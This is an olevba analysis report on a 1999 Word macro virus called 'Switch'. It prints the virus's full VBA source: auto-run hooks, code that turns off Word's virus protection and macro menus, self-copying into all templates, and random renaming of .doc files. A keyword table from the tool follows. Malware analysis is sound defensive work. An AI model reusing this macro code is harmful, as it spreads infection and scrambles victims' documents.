olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shark-49b6cd66cec8b3968e7b12853d44ef2fb82be174
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shark-49b6cd66cec8b3968e7b12853d44ef2fb82be174 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Switch.bas 
in file: Virus.MSWord.Shark-49b6cd66cec8b3968e7b12853d44ef2fb82be174 - OLE stream: 'Macros/VBA/Switch'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'                  >>> Switch - An Israeli Virus <<<
'                             Written by
'                        " The Israeli Shark "
'                         All Rights Reserved
'                               1999(C)

Public TemplateName As String
Public DocName As String

Sub AutoOpen()
    Call First
End Sub

Sub AutoNew()
  Call First
End Sub

Sub AutoClose()
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.MainModule.AutoClose"
   Call First
End Sub

Sub AutoExec()
  Call First
End Sub

Sub AutoExit()
    Call First
End Sub

Sub FileSave()
On Error GoTo NextStep
    Documents.Application.ActiveDocument.Save
NextStep:
    Call First
End Sub


Private Sub First()
   
    On Error GoTo NextStep
    
    'Removes Any Detection Options
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    CommandBars.Item("macro").Enabled = False
    CommandBars.Item("Visual Basic").Enabled = False
   
    Dim varTemplate As Template
   
    DocName = Application.ActiveDocument.FullName
  
    For Each varTemplate In Templates
        TemplateName = varTemplate.FullName
        Application.OrganizerCopy DocName, TemplateName, "Switch", wdOrganizerObjectProjectItems
        varTemplate.Save
    Next varTemplate
       
NextStep:

    Call Second

End Sub
Private Sub Second()
     
    On Error GoTo NextStep
    
     Application.OrganizerCopy TemplateName, DocName, "Switch", wdOrganizerObjectProjectItems
     
NextStep:
  
    Call Third

End Sub

Private Sub Third()
   
    On Error GoTo EndOfProcess
    
    Dim PathString As String
    Dim strFileName(1 To 2) As String
    Dim TempFileName As String
    Dim FilesNum As Integer
    Dim Index As Integer
    Dim Index2 As Integer
    Dim Temp As Integer
     
    PathString = Dir("C:\Protect.sys"): If Len(PathString) Then End
       
    PathString = ActiveDocument.Path
        
    If Right(PathString, 1) <> "\" Then PathString = PathString + "\"
    
    strFileName(1) = Dir(PathString + "Switch.doc")
    If Len(strFileName(1)) Then
        Kill "Switch.doc"
    End If
    
    strFileName(1) = Dir(PathString + "*.DOC")
    
    Do While Len(strFileName(1))
        FilesNum = FilesNum + 1
        strFileName(1) = Dir
    Loop
     
    FilesNum = FilesNum - 1
    strFileName(1) = ""
    strFileName(2) = ""
     
    strFileName(1) = Dir(PathString + "*.Doc")
    
    For Index = 1 To 2
        Randomize (Timer)
        Temp = Int(Rnd(1) * (FilesNum - 1)) + 1
        For Index2 = 1 To Temp
            strFileName(Index) = Dir
        Next Index2
        FilesNum = FilesNum - (Temp - 1)
    Next Index
    
    Open PathString + strFileName(1) For Binary Access Read Lock Read As #1: Input #1, TempLine: Close #1
    Open PathString + strFileName(2) For Binary Access Read Lock Read As #1: Input #1, TempLine: Close #1
    
    Name PathString + strFileName(1) As PathString + "Switch.doc"
    Name PathString + strFileName(2) As PathString + strFileName(1)
    Name PathString + "Switch.doc" As PathString + strFileName(2)

    End

EndOfProcess:

    End

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

